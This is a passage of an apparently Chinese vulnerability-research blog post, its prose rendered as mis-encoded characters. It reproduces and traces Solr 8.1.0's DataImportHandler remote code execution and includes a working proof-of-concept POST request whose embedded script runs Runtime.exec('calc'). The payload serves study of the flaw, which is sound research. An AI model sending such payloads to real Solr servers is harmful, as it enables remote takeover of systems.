    <content type="html"><![CDATA[<h1 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h1><p>å…ˆåˆ°solrä¸Šä¸‹è½½jarå’Œsrcï¼Œè¿™é‡Œé€‰æ‹©çš„ç‰ˆæœ¬ä¸ºv8.1.0</p><p><a href="https://archive.apache.org/dist/lucene/solr/8.1.0/solr-8.1.0.zip" target="_blank" rel="noopener">https://archive.apache.org/dist/lucene/solr/8.1.0/solr-8.1.0.zip</a></p><p><a href="https://archive.apache.org/dist/lucene/solr/8.1.0/solr-8.1.0-src.tgz" target="_blank" rel="noopener">https://archive.apache.org/dist/lucene/solr/8.1.0/solr-8.1.0-src.tgz</a></p><a id="more"></a><p>è¿è¡Œè¿œç¨‹è°ƒè¯•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">anemone<span class="meta">@ANEMONE</span>-ASUS:/mnt/d/Store/document/all_my_work/solr/solr-<span class="number">8.1</span><span class="number">.0</span></span><br><span class="line">$ cd server/ #ä¸€å®šè¦åœ¨serverä¸‹è¿è¡Œ</span><br><span class="line">anemone<span class="meta">@ANEMONE</span>-ASUS:/mnt/d/Store/document/all_my_work/solr/solr-<span class="number">8.1</span><span class="number">.0</span>/server</span><br><span class="line">$ java <span class="string">"-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=9000"</span> -Dsolr.solr.home=<span class="string">"../example/example-DIH/solr/"</span> -jar start.jar --<span class="keyword">module</span>=http</span><br></pre></td></tr></table></figure><p>è®¿é—® <a href="http://localhost:8983/solr/" target="_blank" rel="noopener">http://localhost:8983/solr/</a> å‡ºç°æ§åˆ¶å°è¯´æ˜æœåŠ¡å¯åŠ¨æˆåŠŸ</p><h1 id="å¤ç°"><a href="#å¤ç°" class="headerlink" title="å¤ç°"></a>å¤ç°</h1><p>å‘é€payload(æ³¨æ„tikaæ˜¯demoä¸­å­˜åœ¨çš„coreï¼Œéœ€è¦é’ˆå¯¹å…¶ä»–ç«™ç‚¹åšå˜åŠ¨)</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/solr/tika/dataimport</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1:8983</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Cache-Control</span>: no-cache</span><br><span class="line"><span class="attribute">Content-Length</span>: 363</span><br><span class="line"></span><br><span class="line">command=full-import&amp;dataConfig=</span><br><span class="line">&lt;dataConfig&gt;</span><br><span class="line">  &lt;dataSource type="URLDataSource"/&gt;</span><br><span class="line">  &lt;script&gt;&lt;![CDATA[</span><br><span class="line">  function func(x)&#123;</span><br><span class="line">  java.lang.Runtime.getRuntime().exec("calc");</span><br><span class="line">  &#125; </span><br><span class="line">  ]]&gt;&lt;/script&gt;</span><br><span class="line">  &lt;document&gt;</span><br><span class="line">    &lt;entity name="stackoverflow" url="https://stackoverflow.com/feeds/tag/solr" processor="XPathEntityProcessor" forEach="/feed" transformer="script:func" /&gt;</span><br><span class="line">  &lt;/document&gt;</span><br><span class="line">&lt;/dataConfig&gt;</span><br></pre></td></tr></table></figure><p>èƒ½å¼¹è®¡ç®—å™¨è¯´æ˜payloadç”Ÿæ•ˆã€‚</p><h1 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h1><h2 id="èƒŒæ™¯çŸ¥è¯†"><a href="#èƒŒæ™¯çŸ¥è¯†" class="headerlink" title="èƒŒæ™¯çŸ¥è¯†"></a>èƒŒæ™¯çŸ¥è¯†</h2><h3 id="dataimport"><a href="#dataimport" class="headerlink" title="dataimport"></a>dataimport</h3><p>å…ˆäº†è§£ä¸‹<code>/solr/{core}/dataimport</code>ï¼Œè¯¥APIçš„ä½œç”¨æ˜¯å°†æ•°æ®å…¨é‡/å¢é‡å¯¼å…¥åˆ°solrä¸­ï¼Œæ›´è¯¦ç»†è§£é‡Šåœ¨ï¼š</p><ul><li><a href="https://cwiki.apache.org/confluence/display/solr/DataImportHandler#DataImportHandler-ScriptTransformer" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/solr/DataImportHandler#DataImportHandler-ScriptTransformer</a> </li><li><a href="https://lucene.apache.org/solr/guide/6_6/uploading-structured-data-store-data-with-the-data-import-handler.html" target="_blank" rel="noopener">https://lucene.apache.org/solr/guide/6_6/uploading-structured-data-store-data-with-the-data-import-handler.html</a> </li></ul><p>å…¶ä¸­çœ‹åˆ°payloadä¸­éœ€è¦çš„å­—æ®µæœ‰ï¼š</p><ul><li>dataSourceï¼šæ•°æ®æºï¼Œæœ‰ä»¥ä¸‹å‡ ç§ç±»å‹ï¼Œæ¯ç§ç±»å‹æœ‰è‡ªå·±ä¸åŒçš„å±æ€§<ul><li>JdbcDataSourceï¼šæ•°æ®åº“æº</li><li>URLDataSourceï¼šé€šå¸¸ä¸XPathEntityProcessoré…åˆä½¿ç”¨ï¼Œå¯ä»¥ä½¿ç”¨file://ã€http://ã€                          ftp://ç­‰åè®®è·å–æ–‡æœ¬æ•°æ®æº</li><li>HttpDataSourceï¼šä¸URLDataSourceä¸€æ ·ï¼Œåªæ˜¯åå­—ä¸åŒ</li><li>FileDataSourceï¼šä»ç£ç›˜æ–‡ä»¶è·å–æ•°æ®æº</li><li>FieldReaderDataSourceï¼šå¦‚æœå­—æ®µåŒ…å«xmlä¿¡æ¯æ—¶ï¼Œå¯ä»¥ä½¿ç”¨è¿™ä¸ªé…åˆXPathEntityProcessor                                ä½¿ç”¨</li><li>ContentStreamDataSourceï¼šä½¿ç”¨postæ•°æ®ä½œä¸ºæ•°æ®æºï¼Œå¯ä¸ä»»ä½•EntityProcessoré…åˆä½¿ç”¨</li></ul></li><li>Entityï¼šå®ä½“ï¼Œç›¸å½“äºå°†æ•°æ®æºçš„æ“ä½œçš„æ•°æ®å°è£…æˆä¸€ä¸ªJavaå¯¹è±¡ï¼Œå­—æ®µå°±å¯¹åº”å¯¹è±¡å±æ€§ï¼Œå¯¹äºxml/httpæ•°æ®æºçš„å®ä½“å¯ä»¥åœ¨é»˜è®¤å±æ€§ä¹‹ä¸Šå…·æœ‰ä»¥ä¸‹å±æ€§ï¼š<ul><li>urlï¼ˆå¿…é¡»ï¼‰ï¼šç”¨äºè°ƒç”¨REST APIçš„URLã€‚ï¼ˆå¯ä»¥æ¨¡æ¿åŒ–ï¼‰ã€‚å¦‚æœæ•°æ®æºæ˜¯æ–‡ä»¶ï¼Œåˆ™å®ƒå¿…é¡»æ˜¯æ–‡ä»¶ä½ç½®</li><li>processorï¼ˆå¿…é¡»ï¼‰ï¼šå€¼å¿…é¡»æ˜¯ â€œXPathEntityProcessorâ€</li><li>forEachï¼ˆå¿…é¡»ï¼‰ï¼šåˆ’åˆ†è®°å½•çš„xpathè¡¨è¾¾å¼ã€‚å¦‚æœæœ‰å¤šç§ç±»å‹çš„è®°å½•ç”¨â€œ|â€ï¼ˆç®¡é“ï¼‰åˆ†éš”å®ƒä»¬ã€‚å¦‚æœ                         useSolrAddSchemaè®¾ç½®ä¸ºâ€™trueâ€™ï¼Œåˆ™å¯ä»¥çœç•¥</li><li>stream ï¼ˆå¯é€‰ï¼‰ï¼šå¦‚æœxmléå¸¸å¤§ï¼Œåˆ™å°†æ­¤å€¼è®¾ç½®ä¸ºtrue</li></ul></li></ul><h3 id="ScriptTransformer"><a href="#ScriptTransformer" class="headerlink" title="ScriptTransformer"></a>ScriptTransformer</h3><p>ä»datasourceå˜ä¸ºentityå­˜åœ¨è½¬æ¢(Transform)ï¼Œè€Œdataconfigä¸­å¯ä»¥ä½¿ç”¨javascriptå†™è½¬åŒ–é€»è¾‘ï¼Œä¾‹å¦‚å®˜ç½‘ä¸­ç»™çš„ä¾‹å­</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dataConfig</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span>&lt;![CDATA[</span><br><span class="line"><span class="javascript">                <span class="function"><span class="keyword">function</span> <span class="title">f1</span>(<span class="params">row</span>)        </span>&#123;</span></span><br><span class="line"><span class="javascript">                    row.put(<span class="string">'message'</span>, <span class="string">'Hello World!'</span>);</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">return</span> row;</span></span><br><span class="line">                &#125;</span><br><span class="line">        ]]&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">document</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">entity</span> <span class="attr">name</span>=<span class="string">"e"</span> <span class="attr">pk</span>=<span class="string">"id"</span> <span class="attr">transformer</span>=<span class="string">"script:f1"</span> <span class="attr">query</span>=<span class="string">"select * from X"</span>&gt;</span></span><br><span class="line">                ....</span><br><span class="line">                <span class="tag">&lt;/<span class="name">entity</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">document</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dataConfig</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™ä¹Ÿæ˜¯é€ æˆæœ¬æ¬¡rceçš„sinkç‚¹äº†ã€‚</p><h3 id="Nashorn-è§£æ"><a href="#Nashorn-è§£æ" class="headerlink" title="Nashorn è§£æ"></a>Nashorn è§£æ</h3><p>åœ¨<code>&lt;script&gt;</code>æ ‡ç­¾ä¸­ï¼Œå®šä¹‰äº†jsè„šæœ¬ï¼Œå…¶èƒŒåæ˜¯é€šè¿‡Nashornåšè§£æçš„ï¼Œå…·ä½“æ¥è¯´ï¼Œå…¶å¯ä»¥ä½¿ç”¨jsè¯­æ³•ï¼Œå¼•ç”¨javaä¸­çš„å¯¹è±¡ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> MyJavaClass = Java.type(<span class="string">`my.package.MyJavaClass`</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> result = MyJavaClass.sayHello(<span class="string">'Nashorn'</span>);</span><br><span class="line">print(result);</span><br></pre></td></tr></table></figure><h2 id="é™æ€åˆ†æå…¥å£ç‚¹"><a href="#é™æ€åˆ†æå…¥å£ç‚¹" class="headerlink" title="é™æ€åˆ†æå…¥å£ç‚¹"></a>é™æ€åˆ†æå…¥å£ç‚¹</h2><p>å…ˆæ‹–ä¸‹å¯¹åº”ç‰ˆæœ¬çš„æºä»£ç ï¼ˆ<a href="https://archive.apache.org/dist/lucene/solr/8.1.0/solr-8.1.0-src.tgzï¼‰" target="_blank" rel="noopener">https://archive.apache.org/dist/lucene/solr/8.1.0/solr-8.1.0-src.tgzï¼‰</a></p><p>æ‰¾<code>/solr/{core}/dataimport</code>çš„å…¥å£ï¼Œåœ¨<code>server/solr-webapp/webapp/WEB-INF/web.xml</code>çœ‹filterï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Any path (name) registered in solrconfig.xml will be sent to that filter --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>SolrRequestFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.apache.solr.servlet.SolrDispatchFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">  Exclude patterns is a list of directories that would be short circuited by the </span></span><br><span class="line"><span class="comment">  SolrDispatchFilter. It includes all Admin UI related static content.</span></span><br><span class="line"><span class="comment">  <span class="doctag">NOTE:</span> It is NOT a pattern but only matches the start of the HTTP ServletPath.</span></span><br><span class="line"><span class="comment">  --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>excludePatterns<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>/partials/.+,/libs/.+,/css/.+,/js/.+,/img/.+,/templates/.+<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>SolrRequestFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æ‰€æœ‰çš„urlé€šè¿‡<code>org.apache.solr.servlet.SolrDispatchFilter</code>å¤„ç†ï¼Œåœ¨è¿™ä¸ªç±»é‡Œé¢è°ƒè¯•<code>doFilter()</code>æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest _request, ServletResponse _response, FilterChain chain, <span class="keyword">boolean</span> retry)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!(_request <span class="keyword">instanceof</span> HttpServletRequest)) <span class="keyword">return</span>;</span><br><span class="line">  HttpServletRequest request = closeShield((HttpServletRequest)_request, retry);</span><br><span class="line">  HttpServletResponse response = closeShield((HttpServletResponse)_response, retry);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (cores == <span class="keyword">null</span> || cores.isShutDown()) &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">    <span class="comment">// No need to even create the HttpSolrCall object if this path is excluded.</span></span><br><span class="line">    <span class="keyword">if</span> (excludePatterns != <span class="keyword">null</span>) &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">    AtomicReference&lt;HttpServletRequest&gt; wrappedRequest = <span class="keyword">new</span> AtomicReference&lt;&gt;();</span><br><span class="line">    <span class="comment">// the response and status code have already been sent</span></span><br><span class="line">    <span class="keyword">if</span> (!authenticateRequest(request, response, wrappedRequest)) &#123;<span class="keyword">return</span>;&#125;</span><br><span class="line">    <span class="keyword">if</span> (wrappedRequest.get() != <span class="keyword">null</span>) &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line"> <span class="comment">// Authentication</span></span><br><span class="line">    <span class="keyword">if</span> (cores.getAuthenticationPlugin() != <span class="keyword">null</span>) &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line"> <span class="comment">// Entry</span></span><br><span class="line">    HttpSolrCall call = getHttpSolrCall(request, response, retry);</span><br><span class="line">    ExecutorUtil.setServerThreadFlag(Boolean.TRUE);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      Action result = call.call();</span><br><span class="line">      <span class="keyword">switch</span> (result) &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">  &#125; <span class="keyword">finally</span> &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…³é”®ä»£ç åœ¨17-20è¡Œï¼Œé¦–å…ˆæ ¹æ®requestæ‰¾åˆ°<code>HttpSolrCall</code>å¯¹è±¡ï¼Œå†è°ƒç”¨<code>HttpSolrCal#call()</code>æ–¹æ³•è·å–è¿”å›å€¼ã€‚</p><p>é‚£ä¹ˆè·Ÿåˆ°<code>org.apache.solr.servlet.HttpSolrCall#call()</code>çœ‹ä¸‹â€¦</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Action <span class="title">call</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  <span class="comment">/*...*/</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (cores == <span class="keyword">null</span>) &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">  <span class="keyword">if</span> (solrDispatchFilter.abortErrorMessage != <span class="keyword">null</span>)&#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    init();</span><br><span class="line">    <span class="comment">/*...*/</span></span><br><span class="line">    HttpServletResponse resp = response;</span><br><span class="line">    <span class="keyword">switch</span> (action) &#123;</span><br><span class="line">      <span class="keyword">case</span> ADMIN:</span><br><span class="line">        handleAdminRequest();</span><br><span class="line">        <span class="keyword">return</span> RETURN;</span><br><span class="line">      <span class="keyword">case</span> REMOTEQUERY:</span><br><span class="line">        SolrRequestInfo.setRequestInfo(<span class="keyword">new</span> SolrRequestInfo(req, <span class="keyword">new</span> SolrQueryResponse()));</span><br><span class="line">        remoteQuery(coreUrl + path, resp);</span><br><span class="line">        <span class="keyword">return</span> RETURN;</span><br><span class="line">      <span class="keyword">case</span> PROCESS:</span><br><span class="line">        <span class="keyword">final</span> Method reqMethod = Method.getMethod(req.getMethod());</span><br><span class="line">        HttpCacheHeaderUtil.setCacheControlHeader(config, resp, reqMethod);</span><br><span class="line">        <span class="comment">// unless we have been explicitly told not to, do cache validation</span></span><br><span class="line">        <span class="comment">// if we fail cache validation, execute the query</span></span><br><span class="line">        <span class="keyword">if</span> (config.getHttpCachingConfig().isNever304() ||</span><br><span class="line">            !HttpCacheHeaderUtil.doCacheHeaderValidation(solrReq, req, reqMethod, resp)) &#123;</span><br><span class="line">          SolrQueryResponse solrRsp = <span class="keyword">new</span> SolrQueryResponse();</span><br><span class="line">          SolrRequestInfo.setRequestInfo(<span class="keyword">new</span> SolrRequestInfo(solrReq, solrRsp));</span><br><span class="line">          execute(solrRsp);</span><br><span class="line">          <span class="comment">/*...*/</span></span><br><span class="line">          writeResponse(solrRsp, responseWriter, reqMethod);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> RETURN;</span><br><span class="line">      <span class="keyword">default</span>: <span class="keyword">return</span> action;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line">    <span class="keyword">if</span> (shouldAudit(EventType.ERROR)) &#123;</span><br><span class="line">      cores.getAuditLoggerPlugin().doAudit(<span class="keyword">new</span> AuditEvent(EventType.ERROR, ex, req));</span><br><span class="line">    &#125;</span><br><span class="line">    sendError(ex);</span><br><span class="line">    <span class="comment">// walk the the entire cause chain to search for an Error</span></span><br><span class="line">    Throwable t = ex;</span><br><span class="line">    <span class="keyword">while</span> (t != <span class="keyword">null</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (t <span class="keyword">instanceof</span> Error) &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="åŠ¨æ€è°ƒè¯•"><a href="#åŠ¨æ€è°ƒè¯•" class="headerlink" title="åŠ¨æ€è°ƒè¯•"></a>åŠ¨æ€è°ƒè¯•</h2><h3 id="æ‰¾å…¥å£ç‚¹"><a href="#æ‰¾å…¥å£ç‚¹" class="headerlink" title="æ‰¾å…¥å£ç‚¹"></a>æ‰¾å…¥å£ç‚¹</h3><p>å®åœ¨çœ‹ä¸ä¸‹å»äº†ï¼Œæ ¹æœ¬ä¸çŸ¥é“èµ°å“ªä¸ªcaseï¼Œè¿˜æ˜¯åŠ¨æ€è°ƒè¯•å§ï¼Œä¹‹å‰å·²ç»ç”¨jwdpèµ·äº†é¡¹ç›®ï¼Œç°åœ¨æŠŠsolræºç ä¸‹ä¸‹æ¥ï¼Œç”¨IDEAèµ·ä¸€ä¸ªé¡¹ç›®ï¼Œç„¶ååŠ <code>dist</code>å’Œ<code>server/lib</code>ç›®å½•åˆ°libraryé‡Œï¼Œç”¨RemoteDebugä¸‹æ–­ç‚¹è°ƒè¯•å°±è¡Œäº†ã€‚</p><p><img src="/vulnresearch-Solr_DataImportHandler_RCE/image-20191103160037181.png" alt="image-20191103160037181"></p><p>è®¿é—®é‚£ä¸ªapiåï¼Œè°ƒè¯•å‘ç°èµ°çš„æ˜¯<code>PROCESS</code>çš„caseï¼š</p><p><img src="/vulnresearch-Solr_DataImportHandler_RCE/image-20191103161357607.png" alt="image-20191103161357607"></p><p>ç»§ç»­å‘ä¸‹çœ‹åˆ°å›¾ä¸­542è¡Œï¼š<code>org.apache.solr.servlet.HttpSolrCall#execute()</code>ï¼Œè·Ÿè¿›å»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">execute</span><span class="params">(SolrQueryResponse rsp)</span> </span>&#123;</span><br><span class="line">  solrReq.getContext().put(<span class="string">"webapp"</span>, req.getContextPath());</span><br><span class="line">  solrReq.getCore().execute(handler, solrReq, rsp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è·å–åˆ°SolrCoreï¼Œæ‰§è¡Œå…¶<code>org.apache.solr.core.SolrCore#execute()</code>æ–¹æ³•ï¼Œè¯¥æ–¹æ³•ä¼šè°ƒç”¨<code>handler.handleRequest(req,rsp)</code>å¯¹reqåšå¤„ç†ï¼š</p><p><img src="/vulnresearch-Solr_DataImportHandler_RCE/image-20191103162039712.png" alt="image-20191103162039712"></p><p>åœ¨<code>handler.handleRequest(req,rsp)</code>ä¸­ä¼šè°ƒç”¨<code>org.apache.solr.handler.RequestHandlerBase#handleRequestBody()</code>æ–¹æ³•ï¼Œå¦‚æœæ˜¯ä¹‹å‰èƒ½é™æ€åˆ†æåˆ°è¿™é‡Œï¼Œå¯ä»¥åƒChamd5çš„å¤§ä½¬ä¸€æ ·ï¼Œæœç´¢è¯¥ç±»çš„å®ç°ï¼Œå‘ç°<code>dataimport.DataImportHandler#handleRequestBody()</code>è¿™ä¸ªæ–¹æ³•ï¼Œä½†æ˜¯ç°åœ¨æ—¢ç„¶å·²ç»åŠ¨æ€è°ƒè¯•äº†ï¼Œé‚£ç›´æ¥è·Ÿè¿›å»å°±è¡Œäº†ã€‚</p><p>è‡³æ­¤ï¼Œæˆ‘ä»¬ç»ˆäºæ‰¾åˆ°äº†å¤„ç†è¯¥è¯·æ±‚çš„å…¥å£ã€‚</p><h3 id="è°ƒç”¨æ ˆ"><a href="#è°ƒç”¨æ ˆ" class="headerlink" title="è°ƒç”¨æ ˆ"></a>è°ƒç”¨æ ˆ</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleRequestBody</span><span class="params">(SolrQueryRequest req, SolrQueryResponse rsp)</span></span></span><br><span class="line"><span class="function">          <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    rsp.setHttpCaching(<span class="keyword">false</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> figure out why just the first one is OK...</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">    SolrParams params = req.getParams();</span><br><span class="line">    NamedList defaultParams = (NamedList) initArgs.get(<span class="string">"defaults"</span>);</span><br><span class="line">    RequestInfo requestParams = <span class="keyword">new</span> RequestInfo(req, getParamsMap(params), contentStream);</span><br><span class="line">    String command = requestParams.getCommand();    </span><br><span class="line">    <span class="keyword">if</span> (DataImporter.SHOW_CONF_CMD.equals(command)) &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (command != <span class="keyword">null</span> &amp;&amp; DataImporter.ABORT_CMD.equals(command)) &#123;</span><br><span class="line">      importer.runCmd(requestParams, <span class="keyword">null</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (importer.isBusy()) &#123;<span class="comment">/*...*/</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (command != <span class="keyword">null</span>) &#123;</span><br><span class="line">      <span class="comment">// RCE</span></span><br><span class="line">      <span class="keyword">if</span> (DataImporter.FULL_IMPORT_CMD.equals(command)</span><br><span class="line">              || DataImporter.DELTA_IMPORT_CMD.equals(command) ||</span><br><span class="line">              IMPORT_CMD.equals(command)) &#123;</span><br><span class="line">        importer.maybeReloadConfiguration(requestParams, defaultParams);</span><br><span class="line">        <span class="comment">// è·å–ä¸€ä¸ªSolrWriter</span></span><br><span class="line">        DIHWriter sw = getSolrWriter(processor, loader, requestParams, req);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (requestParams.isDebug()) &#123;</span><br><span class="line">          <span class="keyword">if</span> (debugEnabled) &#123;</span><br><span class="line">            <span class="comment">// Synchronous request for the debug mode</span></span><br><span class="line">            importer.runCmd(requestParams, sw);</span><br><span class="line">            <span class="comment">//...</span></span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="comment">// Asynchronous request for normal mode</span></span><br><span class="line">          <span 